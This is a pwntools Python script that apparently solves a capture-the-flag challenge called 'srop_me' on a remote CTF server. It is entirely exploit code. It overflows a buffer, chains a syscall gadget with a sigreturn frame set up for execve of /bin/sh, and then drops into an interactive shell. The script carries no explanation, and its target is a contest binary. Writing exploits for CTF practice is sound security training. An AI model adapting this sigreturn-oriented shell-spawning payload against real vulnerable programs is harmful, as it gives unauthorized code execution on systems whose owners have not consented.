from pwn import *

elf = context.binary = ELF("./srop_me")
offset = 32

# p = process()
p = remote("challs.n00bzunit3d.xyz", 38894)

syscall = pack(0x0000000000401047)

srop = SigreturnFrame()
srop.rax = 59
# location of syscall; ret
srop.rip = 0x0000000000401047
# location of binsh
srop.rdi = 0x0040200f
srop.rsi = 0

payload = b"A" * offset
payload += pack(elf.symbols['vuln']) + syscall + bytes(srop) 

p.sendline(payload)

# one less becuase of \n character
payload = b"A" * 14

p.sendline(payload)
p.interactive()